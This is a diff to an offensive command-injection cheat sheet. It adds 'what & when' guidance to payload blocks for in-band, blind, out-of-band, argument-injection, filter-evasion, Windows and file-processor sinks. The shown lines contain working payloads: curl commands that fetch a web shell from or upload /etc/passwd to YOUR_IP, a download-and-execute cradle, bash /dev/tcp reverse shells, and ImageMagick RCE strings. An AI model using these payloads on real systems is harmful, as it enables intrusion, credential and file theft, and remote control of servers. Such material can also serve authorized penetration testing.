@@ -7,6 +7,8 @@
 
 ## 1. In-band detection (separators) — Guide §5/§6
 
+*What & when:* your first attempt on any suspected sink — tack a separator + a proof command onto a valid value and see if the output comes back in the page. Use a marker the app can't fake (`id` → `uid=...`, `echo CMDI-7f3a9`). If you see it, that's confirmed in-band RCE; if you don't, it's probably blind — go to §2/§3.
+
 ```
 ;id            | id            || id           & id          && id
 127.0.0.1;id   127.0.0.1| id   127.0.0.1&&id    127.0.0.1||id
@@ -17,6 +19,9 @@ Deterministic markers:  echo CMDI-7f3a9   $(echo 49)   `expr 7 \* 7`   id   whoa
 ```
 
 ## 1b. Context-aware breakout (quotes / parens / escaping) — Guide §6.1
+
+*What & when:* use when plain `;id` didn't fire but you suspect the app wraps your input in quotes. First figure out *which* quote you're inside (send `'` and `"` separately — whichever errors is your quote), then close it before injecting. This is what makes a "filtered-looking" target pop.
+
 ```
 # probe the context first: send  127.0.0.1'  and  127.0.0.1"  separately — whichever errors = the quote you're in.
 unquoted:        127.0.0.1; id            127.0.0.1| id            127.0.0.1 `id`
@@ -29,6 +34,8 @@ second-order:    store the payload in a name/host/path field → it fires when a
 
 ## 2. Time-based blind — Guide §7
 
+*What & when:* use when nothing is echoed back. Order the server to nap (`sleep 10`); a reliably ~10s-slower response = execution. Always repeat 2–3× against a no-payload baseline so you don't mistake network lag for a hit.
+
 ```
 ;sleep 10            `sleep 10`        $(sleep 10)        || sleep 10        & sleep 10
 ;ping -c 10 127.0.0.1       127.0.0.1;ping -c 10 127.0.0.1
@@ -38,6 +45,9 @@ Re-test 2-3x vs a no-payload baseline to exclude jitter.
 ```
 
 ## 2b. Boolean / response-difference blind — no sleep, no OOB (Guide §7.1)
+
+*What & when:* the last-resort case — no `sleep`, timing too noisy, *and* the server can't call out. If the response merely *changes* when your injected command succeeds vs errors, that difference is a yes/no oracle you can read one character at a time (like boolean SQLi). Slow but confirms RCE on the most locked-down targets.
+
 ```
 # when timing is noisy AND OOB egress is blocked: find a response diff between success vs failure, then read 1 char/req.
 ;true            vs   ;false                  → body/status/length differs → separator executes
@@ -50,6 +60,8 @@ Re-test 2-3x vs a no-payload baseline to exclude jitter.
 ```
 
 ## 3. Out-of-band (OOB) detection + exfil — Guide §8/§12
+
+*What & when:* the best blind confirmation — make the server contact a listener you own (interactsh/Collaborator). A DNS/HTTP hit from the target IP proves execution even when nothing shows on the page. DNS first (it escapes most egress filters). Then upgrade the callback to carry real data (`$(whoami)` in the hostname) for a stronger PoC.
 
 ```
 # confirm (DNS escapes most egress filters)
@@ -68,6 +80,8 @@ Windows:  & nslookup CMDI.YOURID.oast.pro     & powershell -c "Resolve-DnsName C
 
 ## 4. Argument / option injection — Guide §9
 
+*What & when:* use when separators are filtered/escaped but your input lands as **one argument** to a known tool. You can't add a command, but you can add the tool's own dangerous **flags** — `curl -o` writes a file, `tar --checkpoint-action=exec=` runs one, `git ext::sh` runs one. Identify the tool (errors/source), then reach for its flag that reaches file-write/RCE.
+
 ```
 curl:   -o /var/www/html/shell.php http://YOUR_IP/shell.php     # file write -> RCE
         --upload-file /etc/passwd http://YOUR_IP/                # exfil
@@ -83,6 +97,8 @@ ffmpeg: -i "concat:/etc/passwd"   (read)   crafted .m3u8 (SSRF/read)
 ```
 
 ## 5. WAF / blacklist evasion — Guide §10
+
+*What & when:* use when a filter blocks your characters/words. Re-spell the same command so it means the same thing to the shell but dodges the blocklist: `${IFS}` for spaces, `c''at`/`c\at` for banned keywords, globbing (`/???/c?t`) to avoid literal names, base64-pipe when everything's blocked. Peel one filter layer at a time.
 
 ```
 SPACES:    cat${IFS}/etc/passwd   cat$IFS$9/etc/passwd   {cat,/etc/passwd}   cat</etc/passwd   X=$'\t';cat${X}/etc/passwd
@@ -100,6 +116,9 @@ python3 poc/evasion.py --cmd "cat /etc/passwd" --block "space,cat"
 ```
 
 ## 5b. Windows command injection — deep (cmd.exe + PowerShell + cradles + DOSfuscation) — Guide §14.1
+
+*What & when:* use when Linux payloads (`;id`, `sleep`) are silent — it's often just a Windows box speaking a different language, not a safe one. Switch to `&`/`|` separators, `&ver`/`&whoami` to prove it, `^`/`""` and env-substring to evade filters, and `powershell -enc` when quotes/spaces are blocked.
+
 ```
 # detect Windows:  & ver      & echo %OS%      ; $PSVersionTable     (Linux ;sleep silent ≠ safe)
 SEPARATORS:   127.0.0.1 & whoami     127.0.0.1 | whoami     127.0.0.1 || whoami     (|| = great blind on a bad host)
@@ -124,6 +143,8 @@ curl http://YOUR_IP/s.exe -o %TEMP%\s.exe & %TEMP%\s.exe
 
 ## 6. Reverse shells (authorized engagements only — Guide §11)
 
+*What & when:* **red-team only** — a reverse shell gives you a live interactive session on the server. For bug bounty you don't need this: a single `id`/`whoami` marker already proves Critical RCE. Only drop a shell on engagements that explicitly authorize it, and clean it up.
+
 ```
 bash:     bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
 bash2:    0<&196;exec 196<>/dev/tcp/YOUR_IP/4444; sh <&196 >&196 2>&196
@@ -140,6 +161,8 @@ python3 poc/revshell.py --lhost YOUR_IP --lport 4444 --type bash --urlencode
 ```
 
 ## 7. Special sinks — Guide §14
+
+*What & when:* use when the feature has no obvious command box but hands your **file** to a processor (ImageMagick/ffmpeg/Ghostscript/git/tar). These tools can be tricked into running commands by crafted file contents — so "upload a photo/video/PDF" or "clone a repo" is a command-injection surface. Match the payload to the exact tool + version; use the FileUpload kit to get the file accepted.
 
 ```
 ImageMagick (MVG/SVG delegate RCE):  push graphic-context; image over 0,0 0,0 'https://x"|id ">'; pop graphic-context
